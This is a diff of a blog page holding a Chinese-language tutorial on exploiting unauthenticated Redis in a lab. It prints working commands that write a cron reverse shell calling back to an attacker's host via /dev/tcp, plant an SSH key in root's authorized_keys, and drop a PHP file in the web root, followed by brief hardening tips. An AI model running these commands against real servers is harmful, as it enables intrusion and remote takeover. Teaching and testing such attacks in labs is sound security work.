@@ -13,17 +13,17 @@
 <meta property="og:url" content="http://yoursite.com/2016/11/12/RedisUnauthorizedUse/index.html">
 <meta property="og:site_name" content="Windy&#39;s blog">
 <meta property="og:description" content="0x01 redis介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。 Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flush">
-<meta property="og:image" content="http://yoursite.com/2016/11/12/RedisUnauthorizedUse/RedisUnauthorizedUse/nmap.png">
-<meta property="og:image" content="http://yoursite.com/2016/11/12/RedisUnauthorizedUse/RedisUnauthorizedUse/shell1.png">
-<meta property="og:image" content="http://yoursite.com/2016/11/12/RedisUnauthorizedUse/RedisUnauthorizedUse/shell2.png">
-<meta property="og:image" content="http://yoursite.com/2016/11/12/RedisUnauthorizedUse/RedisUnauthorizedUse/ssh1.png">
-<meta property="og:image" content="http://yoursite.com/2016/11/12/RedisUnauthorizedUse/RedisUnauthorizedUse/ssh2.png">
-<meta property="og:image" content="http://yoursite.com/2016/11/12/RedisUnauthorizedUse/RedisUnauthorizedUse/shell3.png">
-<meta property="og:updated_time" content="2017-08-23T03:11:18.000Z">
+<meta property="og:image" content="http://oksip9gk9.bkt.clouddn.com/20170827150384121586905.png">
+<meta property="og:image" content="http://oksip9gk9.bkt.clouddn.com/20170827150384138828768.png">
+<meta property="og:image" content="http://oksip9gk9.bkt.clouddn.com/20170827150384143014727.png">
+<meta property="og:image" content="http://oksip9gk9.bkt.clouddn.com/20170827150384145990265.png">
+<meta property="og:image" content="http://oksip9gk9.bkt.clouddn.com/20170827150384148275941.png">
+<meta property="og:image" content="http://oksip9gk9.bkt.clouddn.com/20170827150384149536009.png">
+<meta property="og:updated_time" content="2017-08-27T13:45:12.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="redis未授权访问利用">
 <meta name="twitter:description" content="0x01 redis介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。 Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flush">
-<meta name="twitter:image" content="http://yoursite.com/2016/11/12/RedisUnauthorizedUse/RedisUnauthorizedUse/nmap.png">
+<meta name="twitter:image" content="http://oksip9gk9.bkt.clouddn.com/20170827150384121586905.png">
     
     
         
@@ -102,23 +102,7 @@
   <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2016/11/12/RedisUnauthorizedUse/&title=redis未授权访问利用"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
   <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2016/11/12/RedisUnauthorizedUse/&title=redis未授权访问利用"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
   <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2016/11/12/RedisUnauthorizedUse/&title=redis未授权访问利用"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2016/11/12/RedisUnauthorizedUse/&name=redis未授权访问利用&description=&lt;h1 id=&#34;0x01-redis介绍&#34;&gt;&lt;a href=&#34;#0x01-redis介绍&#34; class=&#34;headerlink&#34; title=&#34;0x01 redis介绍&#34;&gt;&lt;/a&gt;0x01 redis介绍&lt;/h1&gt;&lt;p&gt;Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。&lt;/p&gt;
-&lt;p&gt;Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。&lt;br&gt; 攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。&lt;/p&gt;
-&lt;p&gt;如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。&lt;/p&gt;
-&lt;h1 id=&#34;0x02-本地漏洞环境搭建&#34;&gt;&lt;a href=&#34;#0x02-本地漏洞环境搭建&#34; class=&#34;headerlink&#34; title=&#34;0x02 本地漏洞环境搭建&#34;&gt;&lt;/a&gt;0x02 本地漏洞环境搭建&lt;/h1&gt;&lt;p&gt;靶机：CentOS6.5&lt;/p&gt;
-&lt;p&gt;CentOS安装redis：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;wget &lt;a href=&#34;http://download.redis.io/releases/redis-3.2.0.tar.gz&#34; target=&#34;_blank&#34; rel=&#34;external&#34;&gt;http://download.redis.io/releases/redis-3.2.0.tar.gz&lt;/a&gt;&lt;br&gt;tar xzf redis-3.2.0.tar.gz&lt;br&gt;cd redis-3.2.0&lt;br&gt;make&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;修改配置文件，使可以远程访问：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;vim redis.conf&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;bind 127.0.0.1前面加上#号 protected-mode设为no&lt;br&gt;启动redis-server&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;./src/redis-server redis-conf&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。&lt;/p&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2016/11/12/RedisUnauthorizedUse/&name=redis未授权访问利用&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -192,9 +176,8 @@
 <li>./src/redis-server redis-conf</li>
 </ul>
 <p>默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。</p>
-<a id="more"></a>
 <h1 id="0x03-攻击测试"><a href="#0x03-攻击测试" class="headerlink" title="0x03 攻击测试"></a>0x03 攻击测试</h1><p>nmap扫描服务器开启端口</p>
-<p><img src="RedisUnauthorizedUse/nmap.png" alt="nmap"></p>
+<p><img src="http://oksip9gk9.bkt.clouddn.com/20170827150384121586905.png" alt="20170827150384121586905.png"></p>
 <h2 id="1-redis基本命令"><a href="#1-redis基本命令" class="headerlink" title="1.redis基本命令"></a>1.redis基本命令</h2><p>连接redis：</p>
 <ul>
 <li>redis-cli -h 192.168.63.130<br>查看redis版本信息、一些具体信息、服务器版本信息等等：</li>
@@ -208,25 +191,26 @@
 <h2 id="2-攻击的几种方法"><a href="#2-攻击的几种方法" class="headerlink" title="2.攻击的几种方法"></a>2.攻击的几种方法</h2><h3 id="1-利用计划任务执行命令反弹shell"><a href="#1-利用计划任务执行命令反弹shell" class="headerlink" title="(1).利用计划任务执行命令反弹shell"></a>(1).利用计划任务执行命令反弹shell</h3><p>在redis以root权限运行时可以写crontab来执行命令反弹shell</p>
 <p>先在自己的服务器上监听一个端口</p>
 <ul>
-<li>nc -lvnp 7999<br>然后执行命令: <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.63.130</div><div class="line">192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; config set dir /var/spool/cron/</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; config set dbfilename root</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; save</div><div class="line">OK</div></pre></td></tr></table></figure>
-</li>
+<li>nc -lvnp 7999<br>然后执行命令: </li>
 </ul>
-<p><img src="RedisUnauthorizedUse/shell1.png" alt="shell1"></p>
-<p>nc监听端口已经反弹回来shell</p>
-<p><img src="RedisUnauthorizedUse/shell2.png" alt="shell12"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.63.130</div><div class="line">192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; config set dir /var/spool/cron/</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; config set dbfilename root</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; save</div><div class="line">OK</div></pre></td></tr></table></figure>
+<p><img src="http://oksip9gk9.bkt.clouddn.com/20170827150384138828768.png" alt="20170827150384138828768.png"><br>nc监听端口已经反弹回来shell</p>
+<p><img src="http://oksip9gk9.bkt.clouddn.com/20170827150384143014727.png" alt="20170827150384143014727.png"></p>
 <h3 id="2-写ssh-keygen公钥然后使用私钥登陆"><a href="#2-写ssh-keygen公钥然后使用私钥登陆" class="headerlink" title="(2).写ssh-keygen公钥然后使用私钥登陆"></a>(2).写ssh-keygen公钥然后使用私钥登陆</h3><p>在以下条件下，可以利用此方法<br>Redis服务使用ROOT账号启动<br>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p>
 <p>首先在本地生成一对密钥：</p>
 <ul>
 <li>root@kali:~/.ssh# ssh-keygen -t rsa</li>
 </ul>
-<p><img src="RedisUnauthorizedUse/ssh1.png" alt="ssh1"></p>
-<p>然后redis执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">192.168.63.130:6379&gt; config set dir /root/.ssh/</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; config set dbfilename authorized_keys</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; save</div><div class="line">OK</div></pre></td></tr></table></figure></p>
+<p><img src="http://oksip9gk9.bkt.clouddn.com/20170827150384145990265.png" alt="20170827150384145990265.png"></p>
+<p>然后redis执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">192.168.63.130:6379&gt; config set dir /root/.ssh/</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; config set dbfilename authorized_keys</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; save</div><div class="line">OK</div></pre></td></tr></table></figure>
 <p>save后可以直接利用公钥登录ssh</p>
-<p><img src="RedisUnauthorizedUse/ssh2.png" alt="ssh2"></p>
+<p><img src="http://oksip9gk9.bkt.clouddn.com/20170827150384148275941.png" alt="20170827150384148275941.png"></p>
 <h3 id="3-往web物理路径写webshell"><a href="#3-往web物理路径写webshell" class="headerlink" title="(3).往web物理路径写webshell"></a>(3).往web物理路径写webshell</h3><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell</p>
-<p>执行以下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">192.168.63.130:6379&gt; config set dir /var/www/html/</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; config set dbfilename shell.php</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; save</div><div class="line">OK</div></pre></td></tr></table></figure></p>
+<p>执行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">192.168.63.130:6379&gt; config set dir /var/www/html/</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; config set dbfilename shell.php</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;</div><div class="line">OK</div><div class="line">192.168.63.130:6379&gt; save</div><div class="line">OK</div></pre></td></tr></table></figure>
 <p>将shell写入web目录</p>
-<p><img src="RedisUnauthorizedUse/shell3.png" alt="shell3"></p>
+<p><img src="http://oksip9gk9.bkt.clouddn.com/20170827150384149536009.png" alt="20170827150384149536009.png"></p>
 <h1 id="0x04-安全配置"><a href="#0x04-安全配置" class="headerlink" title="0x04 安全配置"></a>0x04 安全配置</h1><ul>
 <li>限制登录ip</li>
 <li>添加密码</li>
@@ -278,23 +262,7 @@
   <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2016/11/12/RedisUnauthorizedUse/&title=redis未授权访问利用"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2016/11/12/RedisUnauthorizedUse/&title=redis未授权访问利用"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2016/11/12/RedisUnauthorizedUse/&title=redis未授权访问利用"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2016/11/12/RedisUnauthorizedUse/&name=redis未授权访问利用&description=&lt;h1 id=&#34;0x01-redis介绍&#34;&gt;&lt;a href=&#34;#0x01-redis介绍&#34; class=&#34;headerlink&#34; title=&#34;0x01 redis介绍&#34;&gt;&lt;/a&gt;0x01 redis介绍&lt;/h1&gt;&lt;p&gt;Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。&lt;/p&gt;
-&lt;p&gt;Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。&lt;br&gt; 攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。&lt;/p&gt;
-&lt;p&gt;如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。&lt;/p&gt;
-&lt;h1 id=&#34;0x02-本地漏洞环境搭建&#34;&gt;&lt;a href=&#34;#0x02-本地漏洞环境搭建&#34; class=&#34;headerlink&#34; title=&#34;0x02 本地漏洞环境搭建&#34;&gt;&lt;/a&gt;0x02 本地漏洞环境搭建&lt;/h1&gt;&lt;p&gt;靶机：CentOS6.5&lt;/p&gt;
-&lt;p&gt;CentOS安装redis：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;wget &lt;a href=&#34;http://download.redis.io/releases/redis-3.2.0.tar.gz&#34; target=&#34;_blank&#34; rel=&#34;external&#34;&gt;http://download.redis.io/releases/redis-3.2.0.tar.gz&lt;/a&gt;&lt;br&gt;tar xzf redis-3.2.0.tar.gz&lt;br&gt;cd redis-3.2.0&lt;br&gt;make&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;修改配置文件，使可以远程访问：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;vim redis.conf&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;bind 127.0.0.1前面加上#号 protected-mode设为no&lt;br&gt;启动redis-server&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;./src/redis-server redis-conf&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。&lt;/p&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2016/11/12/RedisUnauthorizedUse/&name=redis未授权访问利用&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
